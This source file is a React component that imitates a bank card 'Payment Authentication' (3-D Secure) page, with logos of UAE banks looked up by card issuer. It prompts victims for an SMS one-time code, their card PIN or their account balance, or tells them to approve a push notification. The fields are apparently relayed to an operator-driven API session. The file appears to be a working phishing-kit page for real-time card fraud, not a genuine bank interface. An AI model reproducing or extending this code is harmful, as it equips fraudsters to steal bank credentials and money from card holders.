import React from "react";
import { useBankVerification } from "../../hooks/use-bank-verification";
import type { BankLayoutProps } from "./index";
import type { OperatorMessage, ResendState, TransactionDetails } from "../../types";
import NBD2Styles from "./styles/nbd2-styles";

const PLACEHOLDER_MERCHANT = "eand UAE eShop";
const PLACEHOLDER_AMOUNT = "Dhs. 20.00 AED";
const PLACEHOLDER_DATE = "11/12/2025";
const PLACEHOLDER_CARD = "************4522";
const IMAGE_BASE = "/bank-images";

/**
 * Bank/issuer name to logo filename. Keys are lowercase for case-insensitive lookup.
 * Issuer names come from BIN lookup (HandyAPI, card_bins) - run `bun run list-bank-issuers` in ncc-api to see DB values.
 */
const BANK_TO_LOGO: Record<string, string> = {
  "emirates nbd": "nbd.png",
  "emirates nbd bank (p.j.s.c.)": "nbd.png",
  enbd: "nbd.png",
  nbd: "nbd.png",
  rakbank: "RAKBANK.png",
  "emirates islamic": "EmiratesIslamic.png",
  "dubai islamic": "dib.png",
  dib: "dib.png",
  adcb: "adcb.png",
  fab: "fab.svg",
  "first abu dhabi": "fab.svg",
  mashreq: "mashreq.png",
  mashreqbank: "mashreq.png",
  adib: "nbd.png",
  "abu dhabi islamic": "nbd.png",
  hsbc: "hsbc.jpg",
  citi: "citi.png",
  "sharjah islamic": "sib.png",
  sib: "sib.png",
  psc: "psc.png",
  cmb: "cmb.png",
  "commercial bank of dubai": "cmb.png",
  "commercial bank of dubai(psc)": "cmb.png",
  cbd: "cmb.png",
  afaq: "afaq.jpg",
  emoney: "Emoney.jpg",
  "digital financial services llc": "nbd.png",
};

function getBankLogoPath(bank: string | undefined): string {
  if (!bank) return `${IMAGE_BASE}/nbd.png`;
  const key = bank.toLowerCase().trim();
  const match =
    BANK_TO_LOGO[key] ??
    Object.entries(BANK_TO_LOGO).find(([k]) => key.includes(k) || k.includes(key))?.[1];
  return `${IMAGE_BASE}/${match ?? "nbd.png"}`;
}

function getCardLogoPath(cardBrand: "visa" | "mastercard" | undefined): string {
  if (cardBrand === "mastercard") return `${IMAGE_BASE}/master-card.jpg`;
  return `${IMAGE_BASE}/visa.svg`;
}

const overlayStyles = {
  position: "fixed" as const,
  inset: 0,
  background: "rgba(0,0,0,0.5)",
  display: "flex",
  alignItems: "center",
  justifyContent: "center",
  zIndex: 9999,
};
const errorBannerStyles = {
  padding: "8px 16px",
  background: "#f8d7da",
  color: "#721c24",
  fontSize: 14,
  textAlign: "center" as const,
};

function Spinner({ size = 48 }: { size?: number }) {
  const border = Math.max(2, Math.floor(size / 8));
  return (
    <div
      className="bank-ui-spinner"
      style={
        {
          "--bank-ui-spinner-size": `${size}px`,
          "--bank-ui-spinner-border": `${border}px`,
        } as React.CSSProperties
      }
    />
  );
}

function VerificationPage({
  children,
  footer,
  bank,
  cardBrand,
  isPreview,
  inProgress,
  hasParams,
  error,
}: {
  children: React.ReactNode;
  footer?: React.ReactNode;
  bank?: string;
  cardBrand?: "visa" | "mastercard";
  isPreview: boolean;
  inProgress: boolean;
  hasParams: boolean;
  error?: string | null;
}) {
  return (
    <div>
      <meta charSet="utf-8" />
      <meta name="viewport" content="width=device-width, initial-scale=1.0" />
      <title>Validate Authentication Credential</title>
      <NBD2Styles />
      {isPreview && (
        <div
          style={{
            padding: "8px 16px",
            background: "#fff3cd",
            color: "#856404",
            fontSize: 14,
            textAlign: "center",
            borderBottom: "1px solid #ffc107",
          }}
        >
          Preview mode – no API connection
        </div>
      )}
      {inProgress && hasParams && (
        <div style={overlayStyles}>
          <div style={{ background: "#fff", padding: 24, borderRadius: 8, display: "flex", flexDirection: "column", alignItems: "center", gap: 16 }}>
            <Spinner size={48} />
            <span>Processing...</span>
          </div>
        </div>
      )}
      {error && <div style={errorBannerStyles}>{error}</div>}
      <Shell bank={bank} cardBrand={cardBrand} footer={footer}>
        {children}
      </Shell>
    </div>
  );
}

type BodyVariant = "sms" | "push" | "balance" | "pin";

function TransactionBody({
  transactionDetails,
  isPreview,
  variant,
}: {
  transactionDetails?: TransactionDetails;
  isPreview: boolean;
  variant: BodyVariant;
}) {
  const merchant = isPreview ? PLACEHOLDER_MERCHANT : transactionDetails?.merchantName ?? PLACEHOLDER_MERCHANT;
  const amount = isPreview ? PLACEHOLDER_AMOUNT : transactionDetails?.amount ?? PLACEHOLDER_AMOUNT;
  const date = isPreview ? PLACEHOLDER_DATE : transactionDetails?.date ?? PLACEHOLDER_DATE;
  const card = isPreview ? PLACEHOLDER_CARD : transactionDetails?.cardNumber ?? PLACEHOLDER_CARD;

  const intro =
    variant === "sms"
      ? "We just sent a SMS with secure code to your registered mobile number."
      : variant === "push"
        ? "A push notification has been sent to your mobile app."
        : variant === "balance"
          ? "Please enter your account balance to complete the verification."
          : "Enter the PIN for your card to complete the transaction.";

  const showPaymentDetails = variant === "sms" || variant === "push";

  return (
    <div>
      <p className="mb-0" id="Body1">
        {intro}
        {showPaymentDetails && (
          <>
            <br />
            <br />
            You are authorizing a payment to <span id="contentBlock-merchantname">{merchant}</span> for{" "}
            <span id="contentBlock-amount" className="always-left-to-right">
              {amount}
            </span>{" "}
            on {date} with your card:
          </>
        )}
        {variant === "push" && (
          <>
            <br />
            <br />
            Please approve the transaction on your device.
          </>
        )}
        {!showPaymentDetails && (
          <>
            <br />
            <br />
            Payment to <span id="contentBlock-merchantname">{merchant}</span> for{" "}
            <span id="contentBlock-amount" className="always-left-to-right">
              {amount}
            </span>{" "}
            on {date} with card:
          </>
        )}
      </p>
      {(showPaymentDetails || variant === "balance" || variant === "pin") && (
        <span id="contentBlock-maskedpan" className="always-left-to-right" style={{ fontFamily: "monospace", letterSpacing: 2 }}>
          {card.includes("XXXX") || card.includes("****")
            ? card.replace(/\*+/g, "••••").replace(/X+/g, "••••")
            : card}
        </span>
      )}
    </div>
  );
}

function Shell({
  children,
  footer,
  bank,
  cardBrand,
}: {
  children: React.ReactNode;
  footer?: React.ReactNode;
  bank?: string;
  cardBrand?: "visa" | "mastercard";
}) {
  const bankLogoPath = getBankLogoPath(bank);
  const cardLogoPath = getCardLogoPath(cardBrand ?? "visa");
  return (
    <div className="threeds-two">
      <div className="container-fluid">
        <div className="visa-styling header" id="HeaderLogosFullWidth">
          <button className="closeModal" id="ExitLink" type="button">
            X
          </button>
          <div className="row no-pad">
            <div className="visa-styling bottom-border col-12">
              <div className="pull-left visa-header-one">
                <img alt="Bank Logo" className="visa-header-img" src={bankLogoPath} />
              </div>
              <div className="pull-right visa-header-two">
                <img alt="Card scheme" className="visa-header-img" src={cardLogoPath} />
              </div>
            </div>
          </div>
        </div>
        <div className="visa-styling body" dir="ltr">
          <div className="visa-styling container container-sticky-footer">
            {children}
            {footer ?? (
              <div className="footer" id="FooterLinks">
                <div className="row">
                  <div className="visa-col-12 helpRow" id="Accordion">
                    <ul className="list-group list-group-horizontal flex-wrap pull-left">
                      <li className="list-group-item border-0">
                        <a className="btn btn-link no-decoration" data-bs-target="#FAQ" data-bs-toggle="modal" href="#FAQ" id="FooterLink1">
                          Need some help?
                        </a>
                      </li>
                      <li className="list-group-item border-0">
                        <a className="btn btn-link no-decoration" data-bs-target="#Terms" data-bs-toggle="modal" href="#Terms" id="FooterLink1">
                          learn more about authentication
                        </a>
                      </li>
                    </ul>
                  </div>
                </div>
              </div>
            )}
          </div>
          <form action="/Api/2_1_0/NextStep/StepUp" autoComplete="off" id="StepupForm" method="post" name="StepupForm" />
        </div>
        <div className="modal fade sf-hidden" id="FAQ" tabIndex={-1} role="dialog" aria-labelledby="FAQ-label" data-bs-backdrop="static" data-bs-keyboard="false" aria-modal="true" />
        <div className="modal fade sf-hidden" id="Terms" tabIndex={-1} role="dialog" aria-labelledby="Terms-label" data-bs-backdrop="static" data-bs-keyboard="false" aria-modal="true" />
        <form className="nextstep-form" method="post" />
        <form method="POST" id="TermForm" />
      </div>
    </div>
  );
}

const defaultResendState: ResendState = {
  secondsLeft: 0,
  canResend: true,
  onResend: () => {},
  resending: false,
};

export function VerificationUi(props: BankLayoutProps) {
  const hasParams = Boolean(props.apiBase && props.channelSlug && props.sessionId);

  const hookResult = useBankVerification({
    apiBase: props.apiBase ?? "",
    channelSlug: props.channelSlug ?? "",
    sessionId: props.sessionId ?? "",
    onSuccess: props.onSuccess,
    onDeclined: props.onDeclined,
    onError: props.onError,
    onRedirect: props.onRedirect,
  });

  const {
    missingParams,
    shouldRenderNull,
    inProgress,
    awaitingVerification,
    baseLayout,
    layoutProps,
    error,
  } = hookResult;

  const isPreview = !hasParams || missingParams;
  const showLive = hasParams && !missingParams && !shouldRenderNull && awaitingVerification;

  if (shouldRenderNull && hasParams) {
    return null;
  }

  const lp = layoutProps as Record<string, unknown>;
  const transactionDetails = lp?.transactionDetails as TransactionDetails | undefined;
  const bank = (lp?.bank ?? (isPreview ? "Emirates NBD" : undefined)) as string | undefined;
  const operatorMessage = lp?.operatorMessage as OperatorMessage | null | undefined;

  const messageClass =
    operatorMessage?.level === "error"
      ? "field-validation-error"
      : "field-validation-valid";

  // --- Push layout ---
  if (baseLayout === "push" && showLive) {
    return (
      <VerificationPage
        bank={bank}
        cardBrand={transactionDetails?.cardBrand}
        isPreview={isPreview}
        inProgress={inProgress}
        hasParams={hasParams}
        error={error}
      >
        <h2 className="screenreader-only">Confirm on your device</h2>
        <div className="visa-row">
          <div className="visa-col-12 visa-validate">
            <strong>Payment Authentication</strong>
          </div>
          <div className="row">
            <div className="col-12" id="ValidateOneUpMessage">
              <TransactionBody transactionDetails={transactionDetails} isPreview={isPreview} variant="push" />
            </div>
          </div>
        </div>
        <div className="visa-row">
          <div className="col-12 visa-styling text-center">
            <div className="form-group" style={{ marginTop: 24, marginBottom: 24 }}>
              <Spinner size={64} />
            </div>
            <h3 className="visa-validate" style={{ marginBottom: 8 }}>
              Confirm on your device
            </h3>
            <p className="mb-0">
              {bank
                ? `A push notification has been sent by ${bank}. Please approve the transaction on your device.`
                : "A push notification has been sent to your mobile app. Please approve the transaction on your device."}
            </p>
          </div>
        </div>
      </VerificationPage>
    );
  }

  // --- Balance layout ---
  if (baseLayout === "balance" && showLive) {
    const balance = (lp?.balance as string) ?? "";
    const onBalanceChange = (lp?.onBalanceChange as (v: string) => void) ?? (() => {});
    const onSubmit = (lp?.onSubmit as () => void) ?? (() => {});
    const submitting = (lp?.submitting as boolean) ?? false;
    const canSubmit = (lp?.canSubmit as boolean) ?? false;

    const handleBalanceSubmit = (e: React.FormEvent) => {
      e.preventDefault();
      onSubmit();
    };

    return (
      <VerificationPage
        bank={bank}
        cardBrand={transactionDetails?.cardBrand}
        isPreview={isPreview}
        inProgress={inProgress}
        hasParams={hasParams}
        error={error}
      >
        <h2 className="screenreader-only">Balance verification</h2>
        <div className="visa-row">
          <div className="visa-col-12 visa-validate">
            <strong>Payment Authentication</strong>
          </div>
          <div className="row">
            <div className="col-12" id="ValidateOneUpMessage">
              <TransactionBody transactionDetails={transactionDetails} isPreview={isPreview} variant="balance" />
            </div>
          </div>
        </div>
        {operatorMessage && (
          <div className={`form-group ${messageClass}`} style={{ marginTop: 8 }}>
            {operatorMessage.message}
          </div>
        )}
        <form onSubmit={handleBalanceSubmit} autoComplete="off" noValidate>
          <div className="visa-row">
            <div className="col-12 visa-styling">
              <div className="form-group text-center">
                <div className="input-action">
                  <label htmlFor="balance-input" className="credential-label">Balance</label>
                  <input
                    id="balance-input"
                    type="text"
                    inputMode="decimal"
                    className="form-control visa-styling credential-input"
                    value={balance}
                    onChange={(e) => onBalanceChange(e.target.value)}
                    disabled={submitting}
                    placeholder="e.g. 1,234.56"
                  />
                  <div className="visa-col-12 text-center" style={{ marginTop: 16 }}>
                    <button
                      type="submit"
                      className="visa-styling btn btn-primary text-uppercase vba-button"
                      disabled={submitting || !canSubmit}
                    >
                      {submitting ? "Submitting..." : "Submit"}
                    </button>
                  </div>
                  {submitting && (
                    <div className="text-center" style={{ marginTop: 16, display: "flex", alignItems: "center", justifyContent: "center", gap: 8 }}>
                      <Spinner size={40} />
                      <span>Waiting for confirmation...</span>
                    </div>
                  )}
                </div>
              </div>
            </div>
          </div>
        </form>
      </VerificationPage>
    );
  }

  // --- PIN layout ---
  if (baseLayout === "pin" && showLive) {
    const pinValue = (lp?.pinValue as string) ?? "";
    const onPinChange = (lp?.onPinChange as (v: string) => void) ?? (() => {});
    const pinMasked = (lp?.pinMasked as boolean) ?? true;
    const onPinMaskToggle = (lp?.onPinMaskToggle as () => void) ?? (() => {});
    const wrongCode = (lp?.wrongCode as boolean) ?? false;
    const expiredCode = (lp?.expiredCode as boolean) ?? false;
    const onTryAgain = (lp?.onTryAgain as () => void) ?? (() => {});
    const onSubmit = (lp?.onSubmit as () => void) ?? (() => {});
    const submitting = (lp?.submitting as boolean) ?? false;
    const canSubmit = (lp?.canSubmit as boolean) ?? false;
    const resendState = (lp?.resendState as ResendState) ?? defaultResendState;
    const { secondsLeft, canResend, onResend, resending } = resendState;

    const showLivePin = showLive && baseLayout === "pin";

    const handlePinSubmit = (e: React.FormEvent) => {
      e.preventDefault();
      if (showLivePin) onSubmit();
    };

    const handlePinResend = () => {
      if (showLivePin && canResend) {
        onTryAgain?.();
        onResend();
      }
    };

    const showError = wrongCode || expiredCode || (operatorMessage && operatorMessage.message);
    const errorMessage = wrongCode
      ? "Wrong PIN. Please try again."
      : expiredCode
        ? "Code expired. Please request a new code."
        : operatorMessage?.message ?? "";

    return (
      <VerificationPage
        bank={bank}
        cardBrand={transactionDetails?.cardBrand}
        isPreview={isPreview}
        inProgress={inProgress}
        hasParams={hasParams}
        error={error}
        footer={
          <form
            action="/Api/2_1_0/NextStep/ValidateCredential"
            autoComplete="off"
            id="PinValidateForm"
            method="post"
            name="PinValidateForm"
            noValidate
            onSubmit={handlePinSubmit}
          >
            <div className="visa-row">
              <div className="col-12 visa-styling">
                <div className="form-group text-center">
                  <div id="InputAction">
                    <label htmlFor="PinInput" className="credential-label">PIN</label>
                    <input
                      autoFocus
                      className="form-control visa-styling credential-input"
                      id="PinInput"
                      inputMode="numeric"
                      maxLength={4}
                      name="Pin.Value"
                      placeholder="••••"
                      type={pinMasked ? "password" : "text"}
                      value={showLivePin ? pinValue : ""}
                      onChange={
                        showLivePin
                          ? (e) => onPinChange(e.target.value.replace(/\D/g, "").slice(0, 4))
                          : undefined
                      }
                      disabled={submitting}
                      readOnly={!showLivePin}
                    />
                    <label htmlFor="pin-show-toggle" style={{ display: "block", marginTop: 8, fontSize: 14 }}>
                      <input id="pin-show-toggle" type="checkbox" checked={!pinMasked} onChange={() => onPinMaskToggle()} />
                      {" "}Show PIN
                    </label>
                    <div className="form-group" id="ErrorMessage">
                      <img
                        id="WarningImage"
                        src="data:,"
                        alt="Warning"
                        style={{ display: showError ? "inline" : "none" }}
                      />
                      <span
                        id="ValidationErrorMessage"
                        className="field-validation-error"
                        style={{ display: showError ? "inline" : "none" }}
                      >
                        {errorMessage}
                      </span>
                    </div>
                    <div className="visa-col-12 text-center">
                      <button
                        type="submit"
                        className="visa-styling btn btn-primary text-uppercase vba-button"
                        id="ValidateButton"
                        disabled={showLivePin && (submitting || !canSubmit)}
                      >
                        {submitting ? "Submitting..." : "Submit"}
                      </button>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div className="visa-row" />
            <div className="visa-row">
              <div className="col-12 text-center">
                <span
                  style={{ display: !canResend && secondsLeft <= 0 ? "inline" : "none" }}
                  id="MaximumResendsReachedMessage"
                >
                  You have been reached maximum attempts, Please contact bank
                </span>
                {showLivePin ? (
                  canResend ? (
                    <button
                      id="ResendLink"
                      className="btn btn-link resend-link no-decoration text-uppercase"
                      type="button"
                      onClick={handlePinResend}
                      disabled={resending || submitting}
                    >
                      {resending ? "Sending..." : "RESEND PIN"}
                    </button>
                  ) : (
                    <span className="resend-link no-decoration text-uppercase" style={{ cursor: "default" }}>
                      Resend PIN in {String(Math.floor(secondsLeft / 60)).padStart(1, "0")}:
                      {String(secondsLeft % 60).padStart(2, "0")}
                    </span>
                  )
                ) : (
                  <button
                    id="ResendLink"
                    className="btn btn-link resend-link no-decoration text-uppercase"
                    type="button"
                    disabled
                  >
                    RESEND PIN
                  </button>
                )}
              </div>
            </div>
            <div className="footer" id="FooterLinks">
              <div className="row">
                <div className="visa-col-12 helpRow" id="Accordion">
                  <ul className="list-group list-group-horizontal flex-wrap pull-left">
                    <li className="list-group-item border-0">
                      <a className="btn btn-link no-decoration" data-bs-target="#FAQ" data-bs-toggle="modal" href="#FAQ" id="FooterLink1">
                        Need some help?
                      </a>
                    </li>
                    <li className="list-group-item border-0">
                      <a className="btn btn-link no-decoration" data-bs-target="#Terms" data-bs-toggle="modal" href="#Terms" id="FooterLink1">
                        learn more about authentication
                      </a>
                    </li>
                  </ul>
                </div>
              </div>
            </div>
          </form>
        }
      >
        <h2 className="screenreader-only">Enter your PIN</h2>
        <div className="visa-row">
          <div className="visa-col-12 visa-validate">
            <strong>Payment Authentication</strong>
          </div>
          <div className="row">
            <div className="col-12" id="ValidateOneUpMessage">
              <TransactionBody transactionDetails={transactionDetails} isPreview={isPreview} variant="pin" />
            </div>
          </div>
        </div>
      </VerificationPage>
    );
  }

  // --- SMS layout (default) ---
  const code = (lp?.code as string) ?? "";
  const onCodeChange = (lp?.onCodeChange as (v: string) => void) ?? (() => {});
  const wrongCode = (lp?.wrongCode as boolean) ?? false;
  const expiredCode = (lp?.expiredCode as boolean) ?? false;
  const onTryAgain = (lp?.onTryAgain as () => void) ?? (() => {});
  const onSubmit = (lp?.onSubmit as () => void) ?? (() => {});
  const submitting = (lp?.submitting as boolean) ?? false;
  const canSubmit = (lp?.canSubmit as boolean) ?? false;
  const resendState = (lp?.resendState as ResendState) ?? defaultResendState;
  const { secondsLeft, canResend, onResend, resending } = resendState;

  const showLiveSms = showLive && baseLayout === "sms";

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (showLiveSms) onSubmit();
  };

  const handleResend = () => {
    if (showLiveSms && canResend) {
      onTryAgain();
      onResend();
    }
  };

  const showError = wrongCode || expiredCode || (operatorMessage && operatorMessage.message);
  const errorMessage = wrongCode
    ? "Wrong OTP. Please try again."
    : expiredCode
      ? "Code expired. Please request a new code."
      : operatorMessage?.message ?? "";

  return (
    <VerificationPage
      bank={bank}
      cardBrand={transactionDetails?.cardBrand}
      isPreview={isPreview}
      inProgress={inProgress}
      hasParams={hasParams}
      error={error}
      footer={
          <form
            action="/Api/2_1_0/NextStep/ValidateCredential"
            autoComplete="off"
            id="ValidateCredentialForm"
            method="post"
            name="ValidateCredentialForm"
            noValidate
            onSubmit={handleSubmit}
          >
            <div className="visa-row">
              <div className="col-12 visa-styling">
                <div className="form-group text-center">
                  <div id="InputAction">
                    <label htmlFor="CredentialValidateInput" className="credential-label">Verification Code</label>
                    <input
                      autoFocus
                      className="form-control visa-styling credential-input"
                      data-val="true"
                      data-val-required="Please enter the code"
                      id="CredentialValidateInput"
                      name="Credential.Value"
                      type="text"
                      inputMode="numeric"
                      maxLength={6}
                      value={showLiveSms ? code : ""}
                      onChange={
                        showLiveSms
                          ? (e) => onCodeChange(e.target.value.replace(/\D/g, "").slice(0, 6))
                          : undefined
                      }
                      disabled={submitting}
                      readOnly={!showLiveSms}
                    />
                    <div className="form-group" id="ErrorMessage">
                      <img
                        id="WarningImage"
                        src="data:,"
                        alt="Warning"
                        style={{ display: showError ? "inline" : "none" }}
                      />
                      <span
                        id="ValidationErrorMessage"
                        className="field-validation-error"
                        style={{ display: showError ? "inline" : "none" }}
                      >
                        {errorMessage}
                      </span>
                      <span
                        className="field-validation-valid sf-hidden"
                        data-valmsg-for="Credential.Value"
                        data-valmsg-replace="true"
                      />
                    </div>
                    <div className="visa-col-12 text-center">
                      <button
                        type="submit"
                        className="visa-styling btn btn-primary text-uppercase vba-button"
                        id="ValidateButton"
                        disabled={showLiveSms && (submitting || !canSubmit)}
                      >
                        {submitting ? "Submitting..." : "Submit"}
                      </button>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div className="visa-row" />
            <div className="visa-row">
              <div className="col-12 text-center">
                <span
                  style={{ display: !canResend && secondsLeft <= 0 ? "inline" : "none" }}
                  id="MaximumResendsReachedMessage"
                >
                  You have been reached maximum attempts, Please contact bank
                </span>
                {showLiveSms ? (
                  canResend ? (
                    <button
                      id="ResendLink"
                      className="btn btn-link resend-link no-decoration text-uppercase"
                      type="button"
                      onClick={handleResend}
                      disabled={resending || submitting}
                    >
                      {resending ? "Sending..." : "RESEND CODE"}
                    </button>
                  ) : (
                    <span className="resend-link no-decoration text-uppercase" style={{ cursor: "default" }}>
                      Resend code in {String(Math.floor(secondsLeft / 60)).padStart(1, "0")}:
                      {String(secondsLeft % 60).padStart(2, "0")}
                    </span>
                  )
                ) : (
                  <button
                    id="ResendLink"
                    className="btn btn-link resend-link no-decoration text-uppercase"
                    type="button"
                    disabled
                  >
                    RESEND CODE
                  </button>
                )}
              </div>
            </div>
            <div className="footer" id="FooterLinks">
              <div className="row">
                <div className="visa-col-12 helpRow" id="Accordion">
                  <ul className="list-group list-group-horizontal flex-wrap pull-left">
                    <li className="list-group-item border-0">
                      <a className="btn btn-link no-decoration" data-bs-target="#FAQ" data-bs-toggle="modal" href="#FAQ" id="FooterLink1">
                        Need some help?
                      </a>
                    </li>
                    <li className="list-group-item border-0">
                      <a className="btn btn-link no-decoration" data-bs-target="#Terms" data-bs-toggle="modal" href="#Terms" id="FooterLink1">
                        learn more about authentication
                      </a>
                    </li>
                  </ul>
                </div>
              </div>
            </div>
          </form>
        }
    >
      <h2 className="screenreader-only">Your One-time Passcode has been sent</h2>
      <div className="visa-row">
        <div className="visa-col-12 visa-validate">
          <strong>Payment Authentication</strong>
        </div>
        <div className="row">
          <div className="col-12" id="ValidateOneUpMessage">
            <TransactionBody transactionDetails={transactionDetails} isPreview={isPreview} variant="sms" />
          </div>
        </div>
      </div>
    </VerificationPage>
  );
}
